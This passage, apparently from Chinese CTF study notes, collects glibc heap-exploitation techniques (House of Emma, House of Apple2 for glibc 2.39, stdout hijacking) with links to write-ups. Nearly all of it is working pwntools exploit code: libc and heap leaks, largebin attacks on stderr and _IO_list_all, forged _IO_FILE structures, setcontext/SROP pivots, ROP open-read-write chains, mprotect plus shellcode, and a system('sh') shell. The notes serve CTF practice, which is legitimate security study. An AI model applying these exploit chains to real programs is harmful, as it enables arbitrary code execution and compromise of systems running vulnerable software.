info('libc->'+hex(libcbase))
rdi=libcbase+0x000000000002a3e5
rsi=libcbase+0x000000000002be51
rdxr12=libcbase+0x000000000011f497
ret=libcbase+0x0000000000029cd6
rax=libcbase+0x0000000000045eb0
stderr=libcbase+libc.sym['stderr']
setcontext=libcbase+libc.sym['setcontext']
close=libcbase+libc.sym['close']
read=libcbase+libc.sym['read']
write=libcbase+libc.sym['write']
syscallret=libcbase+libc.search(asm('syscall\nret')).next()
p.recv(10)
heapaddr=u64(p.recv(6).ljust(8,'\x00'))-0x290
info('heap->'+hex(heapaddr))
#fake IO
ioaddr=heapaddr+0xb00
next_chain = 0
fake_IO_FILE = p64(0)*4
fake_IO_FILE +=p64(0)
fake_IO_FILE +=p64(0)
fake_IO_FILE +=p64(1)+p64(2)
fake_IO_FILE +=p64(heapaddr+0xc18-0x68)#rdx
fake_IO_FILE +=p64(setcontext+61)#call addr
fake_IO_FILE = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heapaddr+0x200)  # _lock = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90, '\x00')
fake_IO_FILE +=p64(heapaddr+0xb30) #rax1
fake_IO_FILE = fake_IO_FILE.ljust(0xB0, '\x00')
fake_IO_FILE += p64(1)  # _mode = 1
fake_IO_FILE = fake_IO_FILE.ljust(0xC8, '\x00')
fake_IO_FILE += p64(libcbase+0x2160d0)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(heapaddr+0xb30+0x10)  # rax2
flagaddr=heapaddr+0x17d0
payload1=fake_IO_FILE+p64(flagaddr)+p64(0)+p64(0)*5+p64(heapaddr+0x2050)+p64(ret)
delete(2)
add(6,0x418,payload1)
delete(6)
#large bin attack stderr poiniter
edit(0,p64(libcbase+0x21a0d0)*2+p64(heapaddr+0x290)+p64(stderr-0x20))
add(5,0x440,'aaaaa')
add(7,0x430,'flag')
add(8,0x430,'eee')
#rop
payload=p64(rdi)+p64(0)+p64(close)+p64(rdi)+p64(flagaddr)+p64(rsi)+p64(0)+p64(rax)+p64(2)+p64(syscallret)+p64(rdi)+p64(0)+p64(rsi)+p64(flagaddr)+p64(rdxr12)+p64(0x50)+p64(0)+p64(read)+p64(rdi)+p64(1)+p64(write)
add(9,0x430,payload)
delete(5)
add(10,0x450,p64(0)+p64(1))
delete(8)
# large bin attack topchunk's size
edit(5,p64(libcbase+0x21a0e0)*2+p64(heapaddr+0x1370)+p64(heapaddr+0x28e0-0x20+3))
#trigger __malloc_assert
sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
sla('plz input your cat choice:\n',str(1))
sla('plz input your cat idx:',str(11))
gdb.attach(p,'b* (_IO_wfile_seekoff)')
sla('plz input your cat size:',str(0x450))
p.interactive()
```

<font style="color:#2F8EF4;"></font>

### <font style="color:#000000;">house  of  emma</font>
[House Of Emma-原理](https://ywhkkx.github.io/2022/08/07/House%20Of%20Emma-%E5%8E%9F%E7%90%86/)

[奇安信攻防社区-libc2.34下的堆利用--House_of_emma分析](https://forum.butian.net/share/1691)

[house of emma利用手法详解（21湖湘杯实例解析） - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/348256.html)

<font style="color:#2F8EF4;"></font>

```plain
from pwn import *

    context.log_level = "debug"
    context.arch = "amd64"
    # sh = process('./pwn')
    sh = remote('127.0.0.1', 9999)
    libc = ELF('./lib/libc.so.6')
    all_payload = ""

    def ROL(content, key):
        tmp = bin(content)[2:].rjust(64, '0')
        return int(tmp[key:] + tmp[:key], 2)

    def add(idx, size):
        global all_payload
        payload = p8(0x1)
        payload += p8(idx)
        payload += p16(size)
        all_payload += payload

    def show(idx):
        global all_payload
        payload = p8(0x3)
        payload += p8(idx)
        all_payload += payload

    def delete(idx):
        global all_payload
        payload = p8(0x2)
        payload += p8(idx)
        all_payload += payload

    def edit(idx, buf):
        global all_payload
        payload = p8(0x4)
        payload += p8(idx)
        payload += p16(len(buf))
        payload += str(buf)
        all_payload += payload

    def run_opcode():
        global all_payload
        all_payload += p8(5)
        sh.sendafter("Pls input the opcode", all_payload)
        all_payload = ""

    # leak libc_base
    add(0, 0x410)
    add(1, 0x410)
    add(2, 0x420)
    add(3, 0x410)
    delete(2)
    add(4, 0x430)
    show(2)
    run_opcode()

    libc_base = u64(sh.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - 0x1f30b0  # main_arena + 1104
    log.success("libc_base:\\t" + hex(libc_base))
    libc.address = libc_base

    guard = libc_base + 0x2035f0
    pop_rdi_addr = libc_base + 0x2daa2
    pop_rsi_addr = libc_base + 0x37c0a
    pop_rax_addr = libc_base + 0x446c0
    syscall_addr = libc_base + 0x883b6
    gadget_addr = libc_base + 0x146020  # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    setcontext_addr = libc_base + 0x50bc0

    # leak heapbase
    edit(2, "a" * 0x10)
    show(2)
    run_opcode()
    sh.recvuntil("a" * 0x10)
    heap_base = u64(sh.recv(6).ljust(8, '\\x00')) - 0x2ae0
    log.success("heap_base:\\t" + hex(heap_base))

    # largebin attack stderr
    delete(0)
    edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(libc.sym['stderr'] - 0x20))
    add(5, 0x430)
    edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
    edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
    add(0, 0x410)
    add(2, 0x420)
    run_opcode()

    # largebin attack guard
    delete(2)
    add(6, 0x430)
    delete(0)
    edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(guard - 0x20))
    add(7, 0x450)
    edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
    edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
    add(2, 0x420)
    add(0, 0x410)

    # change top chunk size
    delete(7)
    add(8, 0x430)
    edit(7, 'a' * 0x438 + p64(0x300))
    run_opcode()

    next_chain = 0
    srop_addr = heap_base + 0x2ae0 + 0x10
    fake_IO_FILE = 2 * p64(0)
    fake_IO_FILE += p64(0)  # _IO_write_base = 0
    fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff
    fake_IO_FILE += p64(0)
    fake_IO_FILE += p64(0)  # _IO_buf_base
    fake_IO_FILE += p64(0)  # _IO_buf_end
    fake_IO_FILE = fake_IO_FILE.ljust(0x58, '\\x00')
    fake_IO_FILE += p64(next_chain)  # _chain
    fake_IO_FILE = fake_IO_FILE.ljust(0x78, '\\x00')
    fake_IO_FILE += p64(heap_base)  # _lock = writable address
    fake_IO_FILE = fake_IO_FILE.ljust(0xB0, '\\x00')
    fake_IO_FILE += p64(0)  # _mode = 0
    fake_IO_FILE = fake_IO_FILE.ljust(0xC8, '\\x00')
    fake_IO_FILE += p64(libc.sym['_IO_cookie_jumps'] + 0x40)  # vtable
    fake_IO_FILE += p64(srop_addr)  # rdi
    fake_IO_FILE += p64(0)
    fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + 0x22a0), 0x11))

    fake_frame_addr = srop_addr
    frame = SigreturnFrame()
    frame.rdi = fake_frame_addr + 0xF8
    frame.rsi = 0
    frame.rdx = 0x100
    frame.rsp = fake_frame_addr + 0xF8 + 0x10
    frame.rip = pop_rdi_addr + 1  # : ret

    rop_data = [
        pop_rax_addr,  # sys_open('flag', 0)
        2,
        syscall_addr,

        pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
        0,
        pop_rdi_addr,
        3,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_addr,

        pop_rax_addr,  # sys_write(1, heap, 0x100)
        1,
        pop_rdi_addr,
        1,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_addr
    ]
    payload = p64(0) + p64(fake_frame_addr) + '\\x00' * 0x10 + p64(setcontext_addr + 61)
    payload += str(frame).ljust(0xF8, '\\x00')[0x28:] + 'flag'.ljust(0x10, '\\x00') + flat(rop_data)

    edit(0, fake_IO_FILE)
    edit(2, payload)

    add(8, 0x450)  # House OF Kiwi
    # gdb.attach(sh, "b _IO_cookie_write")
    run_opcode()
    sh.interactive()
```

<font style="color:#2F8EF4;"></font>

### 2.37之后glibc
1. <font style="color:#2F8EF4;">house  of  obstack</font>

[GLIBC2.36利用obstack去劫持执行流 - 何思泊河 - 博客园](https://www.cnblogs.com/trunk/p/17338793.html)

[https://zikh26.github.io/posts/2ddfe893.html](https://zikh26.github.io/posts/2ddfe893.html)

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;">environ  放着 栈地址</font>

#### <font style="color:#2F8EF4;">2.39  apple2 之 shellcode</font>
<font style="color:#2F8EF4;">svcudp_reply = 0x7ffff7c00000+0x179220+29</font>

```plain
svcudp_reply = 0x7ffff7c00000+0x179220+29
swapcontext = 0x7ffff7c580b0+157 #libc_base+0x5814d  #swapcontext+157
```

<font style="color:#2F8EF4;"></font>

```plain
file_addr = heap_base + 0xb10

ogs=[0xe3afe,0xe3b01,0xe3b04]
og=libc_base+ogs[1]
puts_io_all = libc_base + libc.sym['_IO_list_all']  
wfile = libc_base + libc.sym['_IO_wfile_jumps']
addr=libc.symbols['puts']+libc_base

fake_io_addr = heap_base + 0xb10

lock =0x7ffff7e1b780#0x2045c0+libc_base  stdout
rdi = libc_base + next(libc.search(asm('pop rdi;ret;')))
rsi = libc_base + next(libc.search(asm('pop rsi;ret;')))
rdx = libc_base + next(libc.search(asm('pop rdx;ret;')))
r12 =  libc_base + next(libc.search(asm('pop r12;ret;')))
leave_ret = libc_base + next(libc.search(asm('leave;ret;')))

open_addr=0x7ffff7d1b120#libc.symbols['open']+libc_base
read_addr=0x7ffff7d1ba50#libc.symbols['read']+libc_base
write_addr=0x7ffff7d1c560#libc.symbols['write']+libc_base

puts_addr=0x7ffff7c80e50#libc.symbols['puts']+libc_base
setcontext=0x7ffff7c539e0+61
io_all = 0x7ffff7e1b680#libc_base + libc.sym['_IO_list_all']  
wfile = 0x7ffff7e02228#libc_base + libc.sym['_IO_wfile_jumps']
system =0x7ffff7c58740# libc_base+libc.sym['system']
swapcontext = 0x7ffff7c580b0+157#libc_base+0x5814d#swapcontext+157
magic_gadget = 0x7ffff7d7923d+29#+ libc.sym['svcudp_reply'] + 0x1d
mprotect=0x7ffff7d25c10

log.success("magic_gadget -->"+hex(magic_gadget))
syscall = 0x00000000000288b5+libc_base
pop_rax = libc_base + next(libc.search(asm('pop rax;ret;')))
mprotect = libc_base+libc.sym['mprotect']
orw_addr=heap_base+0x1830
flag_addr = heap_base+0xf60      #0x55555555b000
sh_addr = heap_base+0xad0
setcontext = 0x7ffff7c4a950+61

fake_heap = heap_base + 0xb10
svcudp_reply= 0x7ffff7d7923d
heap1 = 0x55555555b700
heap = heap_base + 0xb10+0x200

fake_file = b''
fake_file = p64(0)+p64(1)
fake_file=  fake_file.ljust(0x28,b'\x00')+p64(heap1)    #迁移到另一个堆块
fake_file = fake_file.ljust(0x68,b'\x00')+p64(heap)
fake_file = fake_file.ljust(0x80,b'\x00')+p64(fake_heap)         #rax1  
fake_file = fake_file.ljust(0xb8,b'\x00')+p64(wfile)
payload = p64(0)*2+fake_file+p64(fake_heap+0xe8-0x68)+p64(svcudp_reply)

#libc删除了大量的pop同时没有pop  rdx

edit(2, payload)

bz =  p64(0)+p64(0)+p64(heap1)+p64(heap1)     #指向swapcontext(可以写在其他堆块上)
bz = bz.ljust(0x28,b'\x00')+p64(swapcontext)   
bz = bz.ljust(0x68,b'\x00')+p64(0x55555555b000)       #rdi   地址  0x1000对齐
bz += p64(0x1000)                                     #rsi   长度
bz = bz.ljust(0x78,b'\x00')+p64(heap1)                #rbp
bz += p64(heap1+0x200)                                #rbx
bz += p64(7)                                          #rdx   权限
bz = bz.ljust(0xa0,b'\x00')+p64(0x55555555b7e0)       #rsp shellocde地址 - 8  可变
bz += p64(mprotect)                                   #rcx
bz = bz.ljust(0xe0,b'\x00')+p64(0x55555555b7e8)       #shellcode地址         可变

orw = asm('''
    mov rdi, 0x67616c662f
    push rdi
    mov rdi, rsp
    
    mov rax, 2
    xor rsi, rsi
    syscall
    
    mov rdi,rax
    mov rsi, rbp
    mov rdx, 0x100
    xor rax, rax
    syscall
    
    mov rdi, 1
    mov rdx, rax
    mov rax, 1
    syscall
    
    xor rax, rax
    add rax, 60
    syscall
''')

edit(1, bz+orw)
bug()
```

#### <font style="color:#2F8EF4;">2.39 apple2 之 system</font>
```plain
from pwn import *
context(arch = 'amd64',os = 'linux', log_level = 'debug')
#context.terminal = ['tmux','splitw','-h']

p = process('/home/wsq/桌面/heap')
#p = remote('node2.anna.nssctf.cn',28168)
libc = ELF('/glibc-all-in-one/libs/2.39-0ubuntu8.4_amd64/libc.so.6')

def add(idx,size):
    p.recvuntil('choice:')
    p.send(b'1')
    p.recvuntil(b'index:')
    p.send(str(idx))
    p.recvuntil('size:')
    p.send(str(size))

def dele(idx):
    p.recvuntil('choice:')
    p.send(b'2')
    p.recvuntil(b'index:')
    p.send(str(idx))

def show(idx):
    p.recvuntil('choice:')
    p.send(b'4')
    p.recvuntil(b'index:')
    p.send(str(idx))

def edit(idx,content):
    p.recvuntil('choice:')
    p.send(b'3')
    p.recvuntil(b'index:')
    p.send(str(idx))
    p.recvuntil('content:')
    p.send(content)

def bug():
    gdb.attach(p)

add(0,0x450)
add(1,0x418)
add(2,0x440)
add(3,0x440)

dele(0)          #1
show(0)

p.recvuntil("\n")
libc_=u64(p.recvuntil("\x7f").ljust(8,b'\x00'))    #0x7ffff7e03f20
log.success("libc_ -->"+hex(libc_))
libc_base= libc_ -0x203b20
log.success("libc_base -->"+hex(libc_base))
libc_ = 0x7ffff7e03b20

add(4,0x500)
dele(2)          #2
edit(0,b'a'*0x10)
show(0)

p.recvuntil(b"a"*0x10)

heap_ = u64(p.recvuntil("\x55\x55\x55\x55")[-6:].ljust(8,b'\x00'))
log.success("heap_ -->"+hex(heap_))
heap_base = heap_ - 0x290
log.success("heap_base -->"+hex(heap_base))
listall = 0x7ffff7e044c0#libc_base + libc.sym['_IO_list_all']
log.success(" listall --> "+hex(listall))

#largebin
payload =  p64(libc_)*2  + p64(heap_) + p64(listall - 0x20 )
edit(0,payload)
add(5,0x500)


file_addr = heap_base + 0xb10

ogs=[0xe3afe,0xe3b01,0xe3b04]
og=libc_base+ogs[1]
puts_io_all = libc_base + libc.sym['_IO_list_all']  
wfile = libc_base + libc.sym['_IO_wfile_jumps']
addr=libc.symbols['puts']+libc_base

fake_io_addr = heap_base + 0xb10

lock =0x7ffff7e1b780#0x2045c0+libc_base  stdout
rdi = libc_base + next(libc.search(asm('pop rdi;ret;')))
rsi = libc_base + next(libc.search(asm('pop rsi;ret;')))
rdx = libc_base + next(libc.search(asm('pop rdx;ret;')))
r12 =  libc_base + next(libc.search(asm('pop r12;ret;')))
leave_ret = libc_base + next(libc.search(asm('leave;ret;')))
open_addr=0x7ffff7d144e0#libc.symbols['open']+libc_base
read_addr=0x7ffff7d147d0#libc.symbols['read']+libc_base
write_addr=0x7ffff7d14870#libc.symbols['write']+libc_base
puts_addr=0x7ffff7c80e50#libc.symbols['puts']+libc_base
setcontext=0x7ffff7c539e0+61
io_all = 0x7ffff7e1b680#libc_base + libc.sym['_IO_list_all']  
wfile = 0x7ffff7e02228#libc_base + libc.sym['_IO_wfile_jumps']
system =0x7ffff7c58740# libc_base+libc.sym['system']
swapcontext = 0x7ffff7c53e00+157#libc_base+0x5814d#swapcontext+157
magic_gadget = 0x7ffff7d6a050+29#+ libc.sym['svcudp_reply'] + 0x1d

log.success("magic_gadget -->"+hex(magic_gadget))
syscall = 0x00000000000288b5+libc_base
pop_rax = libc_base + next(libc.search(asm('pop rax;ret;')))
mprotect = libc_base+libc.sym['mprotect']
orw_addr=heap_base+0x1830
flag_addr = heap_base+0xf60      #0x55555555b000
sh_addr = heap_base+0xad0

fake_heap = heap_base + 0xb10
svcudp_reply= 0x7ffff7d6a050+29
heap1 = 0x55555555b290
heap = heap_base + 0xb10+0x200

fake_file = b''
fake_file = p64(0)+p64(1)
fake_file=  fake_file.ljust(0x28,b'\x00')+p64(fake_heap)
fake_file = fake_file.ljust(0x68,b'\x00')+p64(heap)              #放在一个可写的地址段即可
fake_file = fake_file.ljust(0x80,b'\x00')+p64(fake_heap)         #rax1  
fake_file = fake_file.ljust(0xb8,b'\x00')+p64(wfile)
payload = p64(0)*2+fake_file+p64(fake_heap+0xe8-0x68)+p64(system)

edit(2, payload)

edit(1, p64(0)*0x82 +b' sh; ')
bug()
p.send(b'5')

#p *(struct _IO_list_all*)

#b *0x7ffff7c8eb79

p.interactive()

```



#### 2.39 puts 
```python
from pwn import *

sh = process('./bph')
#sh = remote('47.94.214.30',38920)
context.log_level = 'debug'
sh.sendafter('token: ',b'a'*0x28)
sh.recvuntil(b'a'*0x28)
libc_addr = u64(sh.recv(6).ljust(8,b'\x00'))
libc_base = libc_addr - 0xaddae
print('libc_addr=',hex(libc_addr))
print('libc_base=',hex(libc_base))
_IO_2_1_stdin_addr = libc_base + 0x2038e0
_IO_2_1_stdout_addr = libc_base + 0x2045c0
_IO_2_1_stderr_addr = libc_base + 0x2044E0
_IO_buf_base_stdin_addr = _IO_2_1_stdin_addr + 0x38
_IO_file_finish_table_ptr = libc_base + 0x000000000202238
_IO_wfile_jumps = libc_base + 0x202228
set_context_xx = libc_base + 0x4A99D
#pop rsp ; cmovne rax, rdx ; pop rbp ; ret
pop_rsp = libc_base + 0x00000000000de080
print('set_context=',hex(set_context_xx))
pop_rdi = libc_base + 0x000000000010f78b
pop_rsi = libc_base + 0x0000000000110a7d
#pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
pop_rdx = libc_base + 0x00000000000b503c
open_addr = libc_base + 0x11C8A0
read_addr = libc_base + 0x11BA80
write_addr = libc_base + 0x11C590
close_addr = libc_base + 0x116710
def bug():
    gdb.attach(sh)

def add(size,content):
    sh.sendlineafter('Choice:','1')
    sleep(1)
    sh.sendlineafter('Size:',str(size))
    sleep(1)
    sh.sendafter('Content:',content)
    sleep(1)

def edit(index):
    sh.sendlineafter('Choice:','2')
    sleep(1)
#input()
    sh.sendafter('Index:',index)
    sleep(1)

rop_addr = _IO_2_1_stderr_addr + 0x8
flag_addr = rop_addr + 0xa8
rop = p64(pop_rdi)+ p64(flag_addr)+ p64(pop_rsi)+ p64(0)+ p64(open_addr)
rop += p64(pop_rdi)+ p64(3)+ p64(pop_rsi)+ p64(flag_addr)+ p64(pop_rdx)+ p64(0x100)+ p64(0)*4+ p64(read_addr)
rop += p64(pop_rdi)+ p64(1)+ p64(pop_rsi)+ p64(flag_addr)+ p64(write_addr)
#rop = p64(pop_rdi) + p64(0) + p64(close_addr)
rop += b'./flag'
rop = rop.ljust(_IO_2_1_stdout_addr - rop_addr,b'\x00')

#hijack IO_stdin's buf_base

add(_IO_buf_base_stdin_addr +1,'a')
#hijack IO_stdin to point _IO_2_1_stdout_addr
pause()
sh.send(p64(rop_addr -0x2)*4+ p64(_IO_2_1_stdout_addr+0xe8))
sleep(1)

sh.sendlineafter('Choice:','')

fake_IO_stdout = p64(_IO_2_1_stderr_addr)+ p64(0)*2+ p64(set_context_xx)+ p64(_IO_2_1_stdout_addr)
fake_IO_stdout = fake_IO_stdout.ljust(0x88,b'\x00')
fake_IO_stdout += p64(_IO_2_1_stdout_addr +0x60)#lock
fake_IO_stdout = fake_IO_stdout.ljust(0xa0,b'\x00')
fake_IO_stdout += p64(_IO_2_1_stdout_addr)

fake_IO_stdout += p64(pop_rsp)#set_context ret

fake_IO_stdout = fake_IO_stdout.ljust(0xd8,b'\x00')
fake_IO_stdout += p64(_IO_wfile_jumps +0x10) 
#_IO_wfile_jumps+0x38 -> _IO_wfile_jumps+0x48 IO_wfile_seekoff
fake_IO_stdout += p64(_IO_2_1_stdout_addr)
#input()
payload = b'1\n' + rop + fake_IO_stdout
bug()
edit(payload)

sh.interactive()
```





<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1761223733111-75e7c3d2-86c9-43dd-ba0d-91203e682de7.png" width="908.6666666666666" alt="" title="" crop="0,0,1,1" id="FAidv" class="ne-image">

<img src="https://cdn.nlark.com/yuque/0/2025/png/54555654/1761223855094-3d1b3f78-122d-44a8-81c7-65a5813fa38b.png" width="868.6666666666666" alt="" title="" crop="0,0,1,1" id="v1tus" class="ne-image">

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>

<font style="color:#2F8EF4;"></font>


